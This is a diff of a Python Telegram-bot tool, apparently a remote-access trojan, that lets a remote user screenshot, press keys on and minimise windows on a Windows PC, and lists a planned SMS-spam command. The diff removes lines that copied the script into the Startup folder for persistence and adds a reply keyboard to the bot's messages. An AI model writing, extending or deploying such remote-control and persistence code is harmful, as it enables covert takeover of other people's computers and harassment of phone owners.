@@ -61,10 +61,6 @@ if is_admin() or iadm==1:
     tfn=Thisfile.replace(Thisfile_name, "")
     user_path = os.path.expanduser('~') # Путь к папке пользователя
 
-    
-    os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-    os.system(f'copy "{tfn}version.txt" "{user_path}\\AppData\\Roaming"')
-
     while True:
         try:
             p.FAILSAFE = False
@@ -74,6 +70,8 @@ if is_admin() or iadm==1:
             token=str(f.readline())
             f.close()
             fl=0
+            keyboard = telebot.types.ReplyKeyboardMarkup(True)
+            keyboard.row('/help', "/screen")
             bot = telebot.TeleBot(token)
             @bot.message_handler(commands=["start"])
             def screen(message, res=False):
@@ -82,7 +80,7 @@ if is_admin() or iadm==1:
                         bot.send_message(message.chat.id, """
                             \n MADE BY L baga
                             \n Дискорд сервер L baga - https://discord.gg/PXXHeSDdym
-                            \n/help - Все команды""")
+                            \n/help - Все команды""", reply_markup=keyboard)
                     except Exception as e:
                         bot.reply_to()
                 else:
@@ -110,7 +108,7 @@ if is_admin() or iadm==1:
                             \n/update - Откроет ссылку для обновления до актуальной версии
                             \n/altf4 - Исполнит сочетание клавиш alf + f4
                             \n/hidePG - Свернёт все окна
-                            \n/smspam ru/bu number - В разработке...""")
+                            \n/smspam ru/bu number - В разработке...""", reply_markup=keyboard)
                     except Exception as e:
                         bot.reply_to()
                 else:
